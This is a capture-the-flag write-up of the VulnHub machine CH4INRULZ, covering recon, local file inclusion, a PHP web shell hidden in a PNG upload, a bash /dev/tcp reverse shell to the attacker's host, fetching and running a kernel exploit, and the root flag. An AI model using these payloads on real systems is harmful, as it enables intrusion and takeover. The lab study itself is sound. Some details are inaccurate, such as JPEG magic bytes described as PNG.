## CH4INRULZ VulnHub Challenge Writeup

### Overview

CH4INRULZ is a VulnHub machine that involves network reconnaissance, web enumeration, FTP access, file upload exploitation, and privilege escalation. This writeup details the steps taken to gain root access and retrieve the final flag.

### Reconnaissance

#### Network Scanning

First, I identified the target machine on the network using `netdiscover`:

```shellscript
netdiscover -r 192.168.1.0/24
```

The target machine was identified at `192.168.1.20` with MAC Address `08:00:27:B6:AC:A0` (PCS Systemtechnik GmbH).

#### Port Scanning

Next, I performed a port scan using `nmap` to identify open services and their versions:

```shellscript
nmap -sS -Pn --min-rate=1000 --max-retries=2 192.168.1.20 -p-
```

**Results:**

- 21/tcp: `ftp`
- 22/tcp: `ssh`
- 80/tcp: `http`
- 8011/tcp: `unknown`


I then performed a service version scan:

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.20 -p-
```

**Results:**

- 21/tcp: `ftp` vsftpd 2.3.5
- 22/tcp: `ssh` OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
- 80/tcp: `http` Apache httpd 2.2.22 ((Ubuntu))
- 8011/tcp: `http` Apache httpd 2.2.22 ((Ubuntu))


### Web Enumeration

I started by enumerating directories on port 8011 using `gobuster`:

```shellscript
gobuster dir -u http://192.168.1.20:8011/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
```

**Results:**

- `/api` (Status: 301)
- `/server-status` (Status: 403)


I then enumerated the `/api` directory:

```shellscript
gobuster dir -u http://192.168.1.20:8011/api -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

This scan completed without finding any additional directories. I also tried a smaller wordlist:

```shellscript
gobuster dir -u http://192.168.1.20:8011/api -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
```

**Results:**

- `/index.html` (Status: 200)


I then used `curl` to check for interesting files:

```shellscript
curl http://192.168.1.20:8011/api/web_api.php
curl http://192.168.1.20:8011/api/records_api.php
curl http://192.168.1.20:8011/api/files_api.php
curl http://192.168.1.20:8011/api/database_api.php
```

The `files_api.php` seemed interesting.

```shellscript
curl "http://192.168.1.20:8011/api/files_api.php?file=../../../../etc/passwd"
```

This returned a "HACKER DETECTED" message, indicating some level of input filtering.

I then tried to identify valid files by brute-forcing with a wordlist:

```shellscript
while read file; do
  echo "[*] Trying $file"
  curl -s -X POST http://192.168.1.20:8011/api/files_api.php -d "file=$file" | grep -vE 'HACKER|No parameter' && echo "[+] Found: $file"
done < /usr/share/wordlists/dirb/common.txt
```

This revealed that the API was simply returning the HTML structure of the page, regardless of the file.

### FTP Access

I connected to the FTP server as anonymous:

```shellscript
ftp 192.168.1.20
```

```plaintext
Name (192.168.1.20:zengla): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

I was able to log in successfully.

### Web Exploitation

I identified a potential vulnerability in the `files_api.php` script. It seemed to be vulnerable to local file inclusion, but with some filtering.

I tried to bypass the filtering by encoding the file content using base64:

```shellscript
curl -s -X POST http://192.168.1.20:8011/api/files_api.php \
  -d "file=php://filter/convert.base64-encode/resource=/var/www/html/api/files_api.php"
```

This returned a base64 encoded version of the `files_api.php` source code.

I then tried to upload a reverse shell using the uploader on port 80. First, I created a simple PHP reverse shell:

```php
<?php system($_GET["cmd"]); ?>
```

I saved this as `shell.php` and prepended the magic bytes for a PNG image to bypass the file type check:

```shellscript
echo -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg
```

I then uploaded the file:

```shellscript
curl -u frank:'frank!!!' -X POST http://192.168.1.20/development/uploader/upload.php \
  -F "fileToUpload=@shell.jpg" \
  -F "submit=Upload Image"
```

The upload failed because the file was not recognized as an image.

I then downloaded a legitimate PNG image:

```shellscript
wget https://placehold.co/600x400.png -O base.png
```

I combined the PNG image with the PHP code:

```shellscript
cp base.png shell.php.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png
```

I then uploaded the combined file:

```shellscript
curl -u frank:'frank!!!' -X POST http://192.168.1.20/development/uploader/upload.php \
  -F "fileToUpload=@shell.php.png" \
  -F "submit=Upload Image"
```

The file was successfully uploaded.

<img width="681" height="430" alt="image" src="https://github.com/user-attachments/assets/425d4d5e-c9a7-4c14-bf43-db6ea625c898" />



### Reverse Shell

I then triggered the reverse shell by accessing the uploaded file with a command injection:

```shellscript
curl -u frank:'frank!!!' 'http://192.168.1.20/development/uploader/FRANKuploads/shell.php.png?cmd=echo+hi' --output output.txt
```

I set up a netcat listener on my attacking machine:

```shellscript
nc -lnvp 4444
```

I then executed a reverse shell command:

```shellscript
curl -s -X POST 'http://192.168.1.20:8011/api/files_api.php?cmd=%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.6%2F4444%200%3E%261%22' \
  -d "file=/var/www/development/uploader/FRANKuploads/shell.php.png"
```

I received a reverse shell as `www-data`.

### Privilege Escalation

I used `linpeas.sh` to enumerate potential privilege escalation vectors:

```shellscript
wget http://192.168.1.6/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

The `linpeas.sh` script identified several potential exploits, including:

- CVE-2012-0056, CVE-2010-3849, CVE-2010-3850 (full-nelson)
- CVE-2016-5195 (dirtycow)
- CVE-2010-3904 (rds)


I downloaded and compiled the RDS exploit:

```shellscript
wget http://192.168.1.6/15285.c
gcc -o exploit 15285.c
./exploit
```

The RDS exploit successfully granted root privileges.

```plaintext
id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

Finally, I navigated to the `/root` directory to find the `root.txt` file.

```shellscript
cd /root
cat root.txt
```

**Root Flag:** `8f420533b79076cc99e9f95a1a4e5568`

## Conclusion

The CH4INRULZ challenge involved a combination of web application vulnerabilities and kernel exploits. By exploiting a file upload vulnerability, gaining a reverse shell, and then leveraging a known kernel exploit, I was able to escalate privileges to root and retrieve the final flag.

SuggestionsClose suggestions[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}Add IntegrationExplore other VulnHub challengesLearn more about SUID binariesPractice SQL injection techniquesAutomate reconnaissance stepsResearch different shell typesScroll leftScroll right
